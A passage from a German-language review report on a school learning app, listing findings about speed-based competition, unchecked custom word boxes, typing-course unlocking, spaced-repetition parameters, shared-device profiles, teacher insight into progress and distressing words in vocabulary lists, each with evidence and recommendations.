- **Belege:** - `src/storage/daily-plan.ts:88-164` (`dailyPlanCandidates`: „neu“ nur für LernBox-Karten, Deutsch nur bei vorhandenem `learningWordProgress`, Mathe nur Fehler) - `app/frei/german/laufdiktat/running-dictation-app.tsx:66-72, 119-180` (Text: keine Ereignisse, keine Übernahme) - `src/storage/personal-learning-events.ts:1209-1228` (Fehlerwörter aus dem Unterricht ohne `incorrectAttempts` → in der Portion als „review“, nicht als „error“) - `src/domain/math-practice.ts:302-370` (ein Mathe-Element ≈ … (vollständig in `agent-d-paedagogik.md`); Lesen der Kandidatenbildung. Vergleich mit Vault 22.
- **Betroffene:** Kinder ohne Lehrkraftinhalte, Lehrkräfte, die eine kurze, planbare Einheit erwarten.
- **Folgen:** - **[H]** Die Plattform wirkt wie eine Werkzeugsammlung. Lernzeit hängt von der Eigenwahl ab. Signale aus dem Unterricht werden abgeschwächt. Die Tagesportion ist je nach Inhalt 3 oder 25 Minuten lang.
- **Empfehlung (Vorschlag zur Prüfung):** - **Gewichte statt Stückzahl** je Elementart (geschätzte Sekunden), Portion nach Zeit (Standard 10 Minuten). - Unterrichtsfehlerwörter als „error“ markieren. - Neue Inhalte aus einer **curricularen Sequenz** einspeisen: Grundwortschatz der Jahrgangsstufe, Einmaleinsreihen in Lehrplanreihenfolge. - Laufdiktat allein und Textbox-Fehler als Lernwort-Ereignisse übernehmen. Dabei nur falsch geschriebene, nicht vergessene Wörter.
- **Aufwand:** M
- **Erfolgskriterium:** - Ein Kind ohne Lehrkraftinhalte erhält täglich eine Portion mit neuen Grundwortschatz- und Mathe-Elementen. - Die Portion dauert im Probedurchlauf im Median 8–12 Minuten.
- **Quelle:** `agent-d-paedagogik.md`

### D-012 – Leistungsdruck durch Tempo-Wettbewerb, Tempo-Punkte und öffentlich sichtbare Fehlerzahlen; Widerspruch zu den eigenen Motivationsregeln

- **Bereich:** Motivation, Klassenklima
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse); Wirkung als begründetes Risiko
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** - _Konzept:_ Vault 10: „Genauigkeit zählt stärker als Geschwindigkeit“. Vault 23: „Schnelle Antwort: kein eigener Bonus“, ausdrücklich ausgeschlossen ist „Belohnung von Geschwindigkeit als Lernqualität“. Vault 22: keine Bloßstellung. - _Implementierung:_ - Battle entscheidet nach **Tempo**, mit Tinten- und Flimmerangriffen auf andere Kinder. Langsamere Kinder bekommen mehr Ladung (`battleChargeGain`). - Jede Live-Runde endet mit „Tempo-Punkten“ (Zeichen pro Sekunde × 100). - Die Lehreransicht zeigt Namen, Fehlerzahl („3✕“) und „Braucht Hilfe“. Wird sie wie üblich für Raumcode/QR projiziert, ist das öffentlich. - _Positiv:_ Motivation, Häuser und Serie stehen standardmäßig auf `aus`. Es gibt keine Minuspunkte. Der Rückstand wird nicht als Zahl gezeigt.
- **Belege:** - `app/views/laufdiktat/teacher-dictation/constants.ts:63-72` (Battle: „Wer zuerst fertig ist, gewinnt“, „Störangriffe“) - `app/raum/spiel/live-game.tsx:444-508` (`speedPoints` → „Tempo-Punkte“ am Ende jeder Live-Runde) - `src/domain/live-game-feedback.ts:2-6` - `app/frei/german/laufdiktat/running-dictation-app.tsx:304-318` (Sterne immer) - `app/views/laufdiktat/teacher-dictation/live-step.tsx:66-108` (Namen, Fehlerzahl, „Braucht Hilfe“) - `app/ui/lernraum-ui.css:1389-1456` (Flimmer-Angriff, … (vollständig in `agent-d-paedagogik.md`); Lesen der Stellen. Die Flimmerfrequenz liegt unter der WCAG-Schwelle von 3 Blitzen/s. Barrierefreiheit gehört zu Instanz C.
- **Betroffene:** - langsame Schreiber, Kinder mit LRS, ADHS oder Prüfungsangst - Klassen, in denen die Lehrkraft projiziert
- **Folgen:** - **[F]** Bestenlisten und Vergleich können Motivation und Leistung mindern (Hanus & Fox 2015, n. o. v.). Rückmeldung, die Aufmerksamkeit auf das Selbst lenkt, wirkt oft negativ (Kluger & DeNisi 1996). Gamification wirkt im Mittel klein bis mittel und stark kontextabhängig (Sailer & Homner 2020, n. o. v.). - **[H]** Tempo-Wettbewerb beim Rechtschreiben lädt zu Flüchtigkeitsfehlern ein, das Gegenteil des Lernziels.
- **Empfehlung (Vorschlag zur Prüfung):** - Tempo-Punkte entfernen oder nur auf Wunsch der Lehrkraft und privat anzeigen. - Battle nach **Genauigkeit** werten (oder Teamwertung), Störangriffe standardmäßig aus. - Lehreransicht mit **Projektionsmodus**: nur Raumcode und Gesamtfortschritt, keine Namen mit Fehlerzahlen. - Sterne im Laufdiktat allein abschaltbar.
- **Aufwand:** S
- **Erfolgskriterium:** - Keine Anzeige von Tempo als Punktwert ohne Lehrkraftentscheidung. - Der Projektionsmodus zeigt keine personenbezogenen Fehlerzahlen.
- **Quelle:** `agent-d-paedagogik.md`

### D-013 – Eigene Wortboxen ohne Schreibprüfung: Falschschreibungen werden eingeübt und als „richtig“ bestätigt

- **Bereich:** Wortspeicher (eigene Wortboxen), LernBox (eigene Karten)
- **Schwere:** P3
- **Evidenzstatus:** begründetes Risiko (Mechanik bestätigt per Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Ein Kind, das „Fahrad“ in seine Wortbox einträgt, übt künftig „Fahrad“. Die App bestätigt es mit „Richtig“. Bei LRS ist diese Gefahr am größten. Wörter aus Unterricht und Textbox sind dagegen korrekt, weil sie aus Originaltexten stammen.
- **Belege:** - `src/domain/word-box.ts` (Validierung nur Zeichen und Länge) - `src/domain/word-round.ts:207-210` (Vergleich gegen das gespeicherte Wort); Codepfad. Eine Eingabe „Fahrad“ in einer eigenen Box wird akzeptiert.
- **Betroffene:** Kinder mit LRS, jüngere Kinder.
- **Folgen:** **[H]** Falsche Wortbilder werden gefestigt.
- **Empfehlung (Vorschlag zur Prüfung):** - Abgleich gegen eine lokale Wortliste (Grundwortschatz plus alle festen Boxen). Bei Unbekanntem ein Hinweis „Bitte mit Wörterbuch oder Lehrkraft prüfen“. - Optional ein Haken „von der Lehrkraft geprüft“.
- **Aufwand:** S–M
- **Erfolgskriterium:** Unbekannte Wörter werden beim Anlegen gekennzeichnet.
- **Quelle:** `agent-d-paedagogik.md`

### D-014 – Tastenwelt: solider Lehrgang, aber Freischaltung nach einem einzigen genauen Durchgang, kleingeschriebene Nomen und wenig Sinn auf der Bildschirmtastatur

- **Bereich:** Tastschreiben
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** - Die Lektionsfolge entspricht dem motorischen Lernaufbau: Finger einzeln, dann kombiniert, Reihe für Reihe, Genauigkeit vor Tempo. Das ist gut. - Eine Lektion gilt aber nach **einem** Durchgang mit ≥ 90 % als bestanden, ohne Übungsumfang oder Wiederholung an anderen Tagen. Das passt nicht zur Automatisierung. **[F, n. o. v.]** Motorische Fertigkeiten brauchen verteilte Übung. - Vor der Einführung der Großbuchstaben werden Nomen klein geübt („glas“, „uhr“, „haus“). Das steht im Widerspruch zum Rechtschreibziel derselben Plattform. Ein Kind mit LRS tippt dutzendfach „tür“. - Auf dem iPad mit Bildschirmtastatur sind Fingerlektionen fachlich sinnlos. Vault 07 erkennt das an, die App bietet sie trotzdem gleich an.
- **Belege:** - `src/tastschreiben/typing-progress.ts:15-32` (`completed` sobald ein Versuch ≥ 90 %; `problemChars` nur vom letzten Versuch) - `src/tastschreiben/curriculum.ts:155-175, 280-300` (Wortpools „glas, hals, jagd, rad, tag, uhr, tür, haus …“) - `app/frei/typing/typing-coach.ts:54-64`; Lesen.
- **Betroffene:** Tastenwelt-Nutzer, iPad-Klassen.
- **Folgen:** **[H]** Scheinfortschritt im Lehrgang, Konflikt mit der Groß-/Kleinschreibung.
- **Empfehlung (Vorschlag zur Prüfung):** - Freischaltung nach zwei Durchgängen ≥ 90 % an verschiedenen Tagen oder nach einer Mindestzeichenzahl. - Wortpools vor den Großbuchstaben auf Kleinwörter beschränken (als, das, sag, lag, fallen, rufen …). - Bei fehlender Hardwaretastatur einen eigenen Lernweg „Tippgenauigkeit“ ohne Fingerlektionen anbieten.
- **Aufwand:** S
- **Erfolgskriterium:** - Kein Wortpool enthält ein klein geschriebenes Nomen. - Die Freischaltung braucht ≥ 2 Tage.
- **Quelle:** `agent-d-paedagogik.md`

### D-015 – Wiederholungsparameter sind unbelegt und werden nicht ausgewertet

- **Bereich:** Spacing, Kalibrierung
- **Schwere:** P3
- **Evidenzstatus:** offene Frage (Parameter), bestätigt (Codeanalyse: keine Auswertung)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** - Die Staffel 1/3/7/14/30 ist im Vault als „vorläufig, pädagogisch zu erproben“ gekennzeichnet. Das ist ehrlich. - **[F]** Verteiltes Abrufüben ist massiertem deutlich überlegen. Für **wachsende** Abstände gegenüber gleichmäßigen fand eine Metaanalyse keinen Vorteil (Latimier, Peyre & Ramus 2021). Die Staffel ist also vertretbar, aber nicht begründet. - Die App erhebt die nötigen Daten bereits: die erste Antwort bei Fälligkeit je Box. Eine **Behaltensquote je Box** wird nicht berechnet. Die Tagesportion (6 Fehler, 4 neue, 20 gesamt) ist ebenfalls unkalibriert. - Mathe-Posten gelten nach 14 Tagen dauerhaft als „gefestigt“. Eine Erhaltungswiederholung fehlt.
- **Belege:** - `src/domain/leitner-schedule.ts:14-20` (`LEITNER_INTERVAL_DAYS`) - `src/domain/math-practice.ts:80` (`MATH_REVIEW_DAYS`) - `src/domain/daily-plan.ts:14` (Kontingente); Lesen.
- **Betroffene:** alle Lernenden. Die Lehrkraft als Entscheiderin über Parameter.
- **Folgen:** **[H]** Zu lange oder zu kurze Abstände bleiben unbemerkt.
- **Empfehlung (Vorschlag zur Prüfung):** - Eine lokale Kennzahl „richtig bei Fälligkeit je Box“ einführen, als Zielkorridor etwa 80–90 %. Im Lehrer-Export nur aggregiert. - Im Probedurchlauf Abstände danach nachsteuern. - Eine Erhaltungsstufe (60 Tage) für Mathe einführen.
- **Aufwand:** S–M
- **Erfolgskriterium:** Eine Behaltensquote je Box ist sichtbar. Parameteränderungen sind damit begründet.
- **Quelle:** `agent-d-paedagogik.md`

### D-016 – Schreiberleichterung akzeptiert bedeutungsändernde Ein-Buchstaben-Abweichungen

- **Bereich:** LRS-Toleranz (Entscheidung 50), Live-Vokabeln
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Ab 4 Buchstaben wird jede Abweichung um einen Buchstaben angenommen, auch wenn ein **anderes Wort** entsteht: „house/horse“, „Haus/Hals“, „where/were“. Abgemildert ist das durch zwei Dinge: Die Platzierung erfolgt nur als „practice“, und die richtige Schreibung wird angezeigt („So schreibt man es: …“).
- **Belege:** - `src/domain/spelling-tolerance.ts:9-42` (`toleratesSpelling`) - `src/integrations/laufdiktat/live-session.ts:116-127`; `isWithinOneEdit("horse","house") === true` (Codelesung).
- **Betroffene:** Kinder mit Schreiberleichterung.
- **Folgen:** **[H]** Bedeutungsfehler werden als Schreibfehler verbucht.
- **Empfehlung (Vorschlag zur Prüfung):** Toleranz nicht anwenden, wenn die Eingabe einer anderen Lösung derselben Runde oder einem Wort einer Stoppliste entspricht. Optional nur Vertauschung, Doppelung und Auslassung tolerieren.
- **Aufwand:** S
- **Erfolgskriterium:** Ein Test „horse ≠ house“ ist grün. ---
- **Quelle:** `agent-d-paedagogik.md`

## E – Schularten, Differenzierung, Praxis

### E-001 – Das Kernmodell „ein Gerät = ein Kind“ passt nicht zur Geräteausstattung der Grund- und Förderschulen; die LRS-Erleichterung hängt am Gerät statt am Kind

- **Bereich:** Unterrichtspraxis, Geräteorganisation, Inklusion (Grundschule, SFZ, Mittelschule ohne 1:1)
- **Schwere:** P1
- **Evidenzstatus:** bestätigt (reproduziert) für die Erleichterung; bestätigt (Codeanalyse) für das Gerätemodell; Verbreitung geteilter Geräte an bayerischen Grundschulen ist Annahme (nicht verifiziert)
- **Gegenprüfung:** bestätigt (F, reproduziert): kontextabhängig wie B-010 (P1 bei geteilten Geräten); mit B-010 zusammengeführt. LRS-Teil schmal, weil die Erleichterung nur im Live-Raum wirkt. Empfehlung eingeschränkt: „Stationsmodus für alles“ nur als Notlösung, weil er die verteilte Wiederholung abschaltet.
- **Beschreibung:** - _Konzept:_ Vault 01/13 setzen „Geräteprofil = Person“. Ein persönlicher Lernraum mit Tagesportion, Wortspeicher, Fehlerliste, Tier und Klassenmitgliedschaft liegt im Browser des Geräts. - _Implementierung:_ Es gibt keine Profile je Kind (B-010). Die Schreiberleichterung prüft nicht, _wer_ tippt, sondern ob auf dem Gerät _irgendeine_ gültige Freigabe für die Raumklasse liegt. Der Code kennt das Problem selbst: Im Stationsmodus wird bewusst nichts in den Wortspeicher übernommen, „weil mehrere Kinder an einem Gerät“ arbeiten. Für den Normalfall „iPad-Koffer, wechselnde Kinder“ fehlt eine entsprechende Vorkehrung. - _Reproduktion:_ Mia (mit Freigabe) und Ben (ohne) schreiben sich nacheinander auf demselben iPad ein → 2 Mitgliedschaften, Erleichterung in jeder Live-Runde der Klasse **aktiv**, auch wenn Ben tippt. Nimmt Mia am nächsten Tag ein anderes iPad, auf dem nur Lea eingeschrieben … (vollständig in `agent-e-schularten.md`)
- **Belege:** `src/domain/class-seal.ts:150-180` (`isWritingReliefActive`: aktiv, sobald **irgendeine** Mitgliedschaft auf dem Gerät eine gültige Freigabe trägt); `app/raum/use-writing-relief.ts:12-20` (`useWritingRelief` liest alle Mitgliedschaften des Geräts); `app/raum/spiel/live-game.tsx:145`; `src/integrations/laufdiktat/word-store-transfer.ts:140` (Übernahme in den Wortspeicher „im Stationsmodus nie (mehrere Kinder an einem Gerät)“); `app/frei/mathematics/mental-math-app.tsx` (Hinweis „Nutze auf … (vollständig in `agent-e-schularten.md`); `repro-e/e-schularten.test.ts` (Scratchpad), Test „Schreiberleichterung gilt für das Gerät, nicht für das Kind“, Ausgabe `e-schularten.out.txt` Zeilen E1; am 20.10.2026 erneut ausgeführt, 4/4 Tests grün, identische Ausgabe.
- **Betroffene:** Grundschulen und Förderzentren mit geteilten Geräten; Kinder mit LRS (Erleichterung fehlt auf „fremdem“ Gerät) und Kinder ohne LRS (erhalten sie fälschlich); Lehrkräfte, die Ergebnisse falsch deuten.
- **Folgen:** Tagesportion, Fortschritt und Wortspeicher gehören dem Gerät, nicht dem Kind: Die adaptive Wiederholung wird zur Wiederholung der Fehler eines anderen Kindes. Die Lehrkraft sieht tolerant angenommene Wörter als „richtig“ (Vault 13) und kann nicht erkennen, dass ein Kind ohne Freigabe Toleranz erhielt. Die Erleichterung als Fördermaßnahme wird zufällig.
- **Empfehlung (Vorschlag zur Prüfung):** (1) Sofort in `device-support.md` und im Lehrerbereich ehrlich festlegen: „Persönlicher Lernraum nur bei fester Gerätezuordnung oder Geteiltem iPad (Betriebssystem)“; die Erleichterung bei mehr als einer Mitgliedschaft derselben Klasse auf dem Gerät **nicht** aktivieren und der Lehrkraft das melden. (2) Mittelfristig Profilwahl je Kind (Tier + Bild-PIN) mit getrennter Datenbank, wie in B-010 empfohlen; die Freigabe an das gewählte Profil binden. (3) Für Klassen ohne feste Geräte einen „Stationsmodus für alles“: kein persönlicher Lernstand, nur Übung im Moment, klar so benannt.
- **Aufwand:** S (1), L (2), M (3)
- **Erfolgskriterium:** Test: Zwei Mitgliedschaften derselben Klasse auf einem Gerät → keine Erleichterung, Hinweis an die Lehrkraft. Doku nennt unterstützte Geräteszenarien. Nach (2): E2E-Test, in dem zwei Kinder auf einem Gerät getrennte Tagesportionen und nur das berechtigte Kind die Erleichterung erhält.
- **Quelle:** `agent-e-schularten.md`

### E-002 – Die Lehrkraft kann Differenzierung außerhalb des Live-Raums kaum steuern: an Kinder übertragbar sind nur Vokabeln

- **Bereich:** Differenzierung, Lehrerperspektive, Grundschule (Rechtschreibung, Rechnen)
- **Schwere:** P1
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** bestätigt (F): Konzeptlücke. Für Lernwörter existiert `?woerter=` bereits – Auftrags-QR dort S. Empfehlung angepasst: Auftrags-QR für Lernwörter zuerst (S); neue Elementarten im Übertragungspaket erst nach tolerantem Lesen (A-001).
- **Beschreibung:** - _Konzept:_ Vault 01: „Die Lehrkraft … stellt konkrete Inhalte wie einen Vokabelstapel oder eine Lernwortliste bereit.“ Vault 04: Aus dem gemeinsamen Ausgangsinhalt entsteht „für jeden Schüler ein individueller Übungsweg“. - _Implementierung:_ Die 24-h-Inhaltsübergabe überträgt nur Vokabelpakete in die LernBox. Es gibt keinen Weg, eine **Lernwortliste** (z. B. Grundwortschatz der Woche, Wörter aus dem Sprachbuch), einen **Textbox-Text**, eine **Kopfrechen-Einstellung** (Zahlenraum, Einmaleinsreihe) oder eine **Tastenwelt-Station** gezielt einem Kind oder einer Gruppe zuzuweisen. Lernwörter erreichen den Wortspeicher nur, wenn die Lehrkraft einen Live-Textraum öffnet, alle Kinder gleichzeitig online sind und die Übernahme eingestellt ist. Die Arbeitsaufträge (nur Vorschau) enthalten Freitext; die verknüpfte Material-ID nutzt die Schülerseite nicht. - _Folge für Differenzierung:_ Alle … (vollständig in `agent-e-schularten.md`)
- **Belege:** `src/domain/learning-bundle.ts:49-62` (`vocabularyItemV1Schema`: einzige Elementart des übertragbaren Pakets ist `kind: "vocabulary"`); `src/domain/teacher-content-library.ts:8` (Ablage kennt `vocabulary | text | math`, Text und Mathe aber nur für Live-Räume); `src/integrations/laufdiktat/word-store-transfer.ts:96-140` (Wörter gelangen nur über eine Live-Textrunde in die Wortbox „Aus dem Unterricht“); `src/domain/student-assignment.ts:8-23` und `src/domain/release.ts:96-100` (Aufgaben nur … (vollständig in `agent-e-schularten.md`); Schemata und Übernahmewege wie angegeben lesen; Suche nach weiteren Elementarten im Bündel ergibt nur `vocabulary`.
- **Betroffene:** Lehrkräfte aller Schularten; besonders Grundschule, Förderschule, Deutschklassen; Kinder, die Struktur brauchen.
- **Folgen:** Die Lehrkraft kann die Plattform nicht in ihre Wochenplanung („Gruppe A: ZR 20 mit Zehnerübergang; Gruppe B: Einmaleins 7er; Lea: Wortbox ie, nur 5 Wörter“) einbinden. Sie fällt auf analoge Pläne zurück und nutzt die App nur als Live-Laufdiktat. Der beworbene Nutzen „differenziertes, selbstständiges Arbeiten“ entsteht nicht.
- **Empfehlung (Vorschlag zur Prüfung):** (1) Kurzfristig, kleinster Hebel: Im Lehrerbereich einen **Auftragslink/QR** erzeugen, der vorhandene Parameter nutzt (`/frei/german?woerter=…`, Kopfrechnen mit festen Optionen, Textbox-Text-ID) und keine Personendaten enthält. Dazu die Kopfrechen-Optionen als URL-Parameter lesbar machen. Druckbar als Kärtchen je Gruppe. (2) Mittelfristig das Übertragungspaket um die Elementarten `learning-word-list`, `textbox-selection` und `math-preset` erweitern (A-009 beschreibt den fehlenden Modulvertrag). (3) Arbeitsaufträge erst freigeben, wenn ein Auftrag das Kind direkt in die passende Übung führt.
- **Aufwand:** S–M (1), L (2), M (3)
- **Erfolgskriterium:** Eine Lehrkraft kann in unter 3 Minuten für drei Leistungsgruppen je einen QR erzeugen, der das Kind ohne weitere Auswahl in die vorgesehene Übung (Wortliste, Zahlenraum, Text) führt; E2E-Test für jeden Auftragstyp.
- **Quelle:** `agent-e-schularten.md`

### E-003 – Die Lehrkraft erfährt aus der Plattform fast nichts über Lernstände; die Live-Ergebnisse sind nur Tiernamen ohne Verlauf

- **Bereich:** Lehrerperspektive, Diagnostik im Unterricht, Spannungsfeld Datenschutz–Förderbedarf
- **Schwere:** P1
- **Evidenzstatus:** bestätigt (Codeanalyse)
- **Gegenprüfung:** bestätigt (F): Konzeptlücke; Fehlerwörter je Teilnehmer liegen bereits vor (Aufwand S statt M). Neu: CSV startet beim Beenden automatisch, ggf. auf dem Tafelrechner. Empfehlung angepasst: zuerst Fehlerwörter je Tier ohne neue Datenflüsse; Namen in der CSV erst nach F-002, B-007 und B-009; Kurzbericht per QR ist fälschbar und selbstselektiv (F, Teil 3.1).
- **Beschreibung:** - _Konzept:_ Vault 02 und 04 nennen vier Modi einschließlich **Lernstandscheck** und versprechen ein Dashboard mit „aggregiertem Live-Fortschritt“; Vault 11 beschreibt QR-Statistiken der Kinder an die Lehrkraft. Der Auftrag nennt „Kompetenzchecks und Fortschrittsdarstellung“. - _Implementierung im Freigabestand:_ - Aus dem **freien Üben** (Wortspeicher, Textbox, Kopfrechnen, Tastenwelt, Tagesportion) erreicht die Lehrkraft **kein** Signal. Einziger Weg ist der vom Kind gedruckte „Laufzettel“ (`app/views/wortspeicher/worksheet-screen.tsx`, Feld „Name oder Kennung“), der Drucker am Schülergerät voraussetzt und Selbstauskunft bleibt. - Aus dem **Live-Raum** sieht die Lehrkraft während der Runde Tiere mit Fortschritt, Sternen und „Braucht Hilfe“. Der CSV-Export enthält ebenfalls nur Tiere („Fuchs 2“), keine Namen, keinen Inhaltstitel, keine Klasse und keine Fehlerwörter je Kind. Eine … (vollständig in `agent-e-schularten.md`)
- **Belege:** `src/integrations/laufdiktat/teacher-results.ts:40-98` (`csvParticipantLabel`: Spalte „Name“ = Tier mit Nummer, z. B. „Fuchs 2“; `buildTeacherResultCsv`: Fortschritt, Fehler, Versuche, Spicker, Sterne, darunter nur klassenweite „Häufigste Fehler“; kein Inhaltstitel, keine Klasse, keine Fehlerwörter je Kind); `app/components/live-room-join.tsx:575-583` (Raumidentität anonym, Tier aus dem Geräteprofil); `app/lehrer/live/dictation-adapter.ts:87-104` (`strugglingNames`: „Braucht Hilfe“ nur für die … (vollständig in `agent-e-schularten.md`); Codelesung der genannten Stellen; CSV-Kopfzeile in `teacher-results.ts:61-69`.
- **Betroffene:** Lehrkräfte aller Schularten, besonders Förderlehrkräfte und Klassenleitungen in Grund- und Mittelschule; Kinder mit Förderbedarf.
- **Folgen:** Die Lehrkraft muss Lernprobleme weiterhin analog erheben; die Plattform erzeugt Übungszeit ohne pädagogische Rückkopplung. Nach wenigen Wochen entsteht der Eindruck „die Kinder tippen, aber ich weiß nicht, was es bringt“ – ein typischer Grund, ein Werkzeug wieder aufzugeben (eigene Hypothese).
- **Empfehlung (Vorschlag zur Prüfung):** (1) CSV-Export um Inhaltstitel, Datum, Klasse und Fehlerwörter je Teilnehmer ergänzen; im Klassenraum die Spalte optional mit dem lokal beim Lehrer bekannten Namen füllen, wenn sich das Kind per Einschreibe-Mitgliedschaft (nicht nur per Tier) ausweist – Zuordnung nur auf dem Lehrergerät (Vault 13, Stufe „Persönliche Lehrerübersicht“). (2) Eine lokale Ergebnisablage auf dem Lehrergerät je Klasse, mit Löschfrist. (3) Den QR-Leistungsbrief aus Vault 11 für **wenige Kennwerte** freigeben, die das Kind bewusst übergibt (Vorschlag D-003, Abschnitt 9). (4) Vault 02/04 und `01-bestandsaufnahme.md` zum entfallenen Lernstandscheck korrigieren.
- **Aufwand:** M (1), M (2), M–L (3), S (4)
- **Erfolgskriterium:** Nach einer Live-Runde kann die Lehrkraft ohne Mitschrift sagen, welches Kind welche Wörter falsch schrieb; nach vier Wochen kann sie je Kind mindestens einen nachvollziehbaren Lernstandswert aus freiwillig übergebenen Daten ablesen, ohne dass Lernhistorien das Schülergerät verlassen.
- **Quelle:** `agent-e-schularten.md`

### E-004 – Kein Zielgruppen- und Niveaumodell: Sprache, Mengen und Eingabeform setzen selbstständige Leser und Tipper voraus

- **Bereich:** Eignung nach Jahrgangsstufe und Förderbedarf (Jgst. 1/2, Förderschwerpunkte Lernen, Sprache, geistige Entwicklung, … (vollständig in `agent-e-schularten.md`)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (Codeanalyse und Textmessung); Wirkung auf die Kinder begründetes Risiko (keine Erprobung mit Kindern möglich)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** - Weder Vault noch Doku definieren eine Zielgruppe (Suche nach „Grundschule“, „Jahrgangsstufe“, „Förderschule“, „DaZ“ in Vault 00–24, README, `docs/*.md`: kein Treffer außer LRS-Bezügen). Das erklärt, warum Inhalte und Oberfläche keine Altersstufe kennen. - **Sprache der Oberfläche:** Die Schülerseiten verwenden Fachbegriffe wie Merkstufe, Box, Wortbox, fällig, Zahlenraum, Lückenaufgabe, Rechenzahl, Browserprofil, Synchronisation, WebDAV, App-Passwort, Lernverlauf. Messung der sichtbaren Texte (iPad-Ansicht, Lauf 2): Anteil langer Wörter (> 6 Buchstaben) 38 % auf `/ueben`, 48 % auf `/frei/mathematics`, 45 % auf `/raum`, 40 % in den Einstellungen; die Einstellungsseite hat 80 Bedienelemente. Die LIX-Werte der Oberfläche sind wegen kurzer Textfragmente nur grob deutbar und werden hier nicht als Beleg verwendet. - **Mengen und Ziele:** Eine Wortbox zeigt „0 / 105 sicher“; die Tagesportion … (vollständig in `agent-e-schularten.md`)
- **Belege:** Klassenmodell ohne Jahrgangsstufe/Schulart (`app/components/teacher-class-configurator.tsx:420-461`: Name, Lehrkraft, Schuljahr); `src/domain/daily-plan.ts` (`DAILY_PLAN_SIZE = 20`, für alle gleich); `src/domain/german-learning-content.ts:136-190` (8 feste Wortboxen à 104–133 Wörter, ohne Niveaustufe); `app/frei/mathematics/mental-math-app.tsx:395-405` und Feineinstellungen (Zahlenraum, „0 als Rechenzahl vermeiden“, „Lückenaufgaben“, Hinweis „eigenes Browserprofil“); … (vollständig in `agent-e-schularten.md`); `repro-e/browser-texts.mjs` (Chromium, iPad-Viewport, Dev-Server 3002) → `student-texts.json`; `repro-e/readability.mjs` → `readability.out.txt` (Silbenzählung heuristisch, Werte sind Näherungen); Bildschirmfotos `repro-e/shots/`.
- **Betroffene:** Jgst. 1/2; Kinder mit Förderschwerpunkt Lernen, Sprache oder geistige Entwicklung; DaZ-Kinder in Deutschklassen; Kinder mit Leseschwäche.
- **Folgen:** Diese Kinder können nur mit Begleitung arbeiten; das Ziel „selbstständig“ wird verfehlt, die Lehrkraft wird zur Bedienhilfe. Kinder scheitern an der Bedienung und nicht am Lerngegenstand; Ergebnisse spiegeln Lesefähigkeit statt Rechtschreib- oder Rechenkompetenz.
- **Empfehlung (Vorschlag zur Prüfung):** (1) Zielgruppe ausdrücklich festlegen (Vorschlag: „Jgst. 3–6 und Basisförderung Sek I; Jgst. 1/2 und Förderschwerpunkt geistige Entwicklung nicht Ziel der Version 1“) und in README/Vault 00 nennen. (2) Eine „einfache Ansicht“ als Kindeinstellung oder Lehrervorgabe per QR: Fachbegriffe ersetzen (z. B. „Wörter, die du sicher kannst“ statt „Merkstufe“), Einstellungen für Sicherung und Cloud ausblenden, Portion 10 statt 20, Vorlesen-Schaltfläche an jeder Anleitung. (3) Wortboxen in Niveaustufen teilen (siehe D-007) und Startauswahl nach Stufe anbieten.
- **Aufwand:** S (1), M–L (2), M (3)
- **Erfolgskriterium:** Zielgruppe dokumentiert. In einer Beobachtung mit fünf Kindern der Zielstufe startet jedes Kind die vorgesehene Übung ohne Erwachsenenhilfe; die einfache Ansicht enthält keinen Begriff aus der Fachbegriffliste oben.
- **Quelle:** `agent-e-schularten.md`

### E-005 – Feste Wortboxen enthalten Kriegs-, Gewalt- und Todeswörter in zufälligen Runden – belastend für Grundschulkinder und Kinder mit Fluchterfahrung

- **Bereich:** Altersangemessenheit, DaZ/Deutschklassen, traumasensibler Unterricht
- **Schwere:** P3 (Prüfinstanz: P2)
- **Evidenzstatus:** bestätigt (reproduziert) für die Häufigkeit; Bewertung als belastend ist eigene Einschätzung (Hypothese, keine Normliste)
- **Gegenprüfung:** abgeschwächt (F, Teil 2.11): Code-Befund richtig (Kriegs- und Gewaltwörter in Grundschul-Wortboxen), Anteil und „belastend“ ohne Wirkungsbeleg; als Wortwahlprüfung P3, Aufwand S.
- **Beschreibung:** D-007 belegt bereits die Mischung von Grundschul- und Sek-I-Wortschatz. Ergänzend aus Sicht der Schularten: - Die Wahrscheinlichkeit, dass eine zufällige 10er-Runde **mindestens ein belastendes Wort** (Krieg, Krieger, Gewehr, Friedhof, Dieb, Diebstahl, Raub, Räuber, räuberisch, Feind, Drohung, drohen, quälen, lähmen) enthält, beträgt je Box: langes i 39 %, Umlaute 34 %, Auslautverhärtung 33 %, Dehnungs-h 27 %; in drei weiteren Boxen 0 %. - Mindestens ein für die Grundschule untypisches, abstraktes Wort (z. B. Tugend, Vertrag, Gesetz, Gewohnheit, Universität, Praktikum, Portemonnaie, Charakter, Niveau, Ruhestand) steht in 75–84 % der Runden der Boxen Auslautverhärtung, Umlaute, langes i, Dehnungs-h und Merkwörter. - In Deutschklassen und Übergangsklassen sitzen in Bayern viele Kinder mit Kriegs- und Fluchterfahrung (Ukraine, Syrien, Afghanistan; allgemein bekannt, nicht online … (vollständig in `agent-e-schularten.md`)
- **Belege:** `src/domain/german-learning-content.ts:48` (Auslautverhärtung: „Krieg“), `:64` (Umlaute: „quälen … lähmen“), `:81-84` (langes i: „Diebstahl“, „Friedhof“, „Krieg Krieger“), `:92` (Dehnungs-h: „Gewehr“); Auswahl `src/domain/word-round.ts:86-99` (`sampleRoundWords`, reiner Zufall); `repro-e/e-schularten.test.ts`, Test „Anteil langer, abstrakter und belastender Wörter je Box“: 2 000 simulierte Runden je Box mit `sampleRoundWords` und festem Zufallsstart; Ausgabe E3 in `e-schularten.out.txt`. Die Listen „nicht GS-typisch“ und „belastend“ sind bewusst eng und subjektiv; sie ersetzen keine Prüfung gegen den bayerischen Grundwortschatz.
- **Betroffene:** Grundschulkinder, Kinder in Deutschklassen, Kinder mit Fluchterfahrung, Förderschulen.
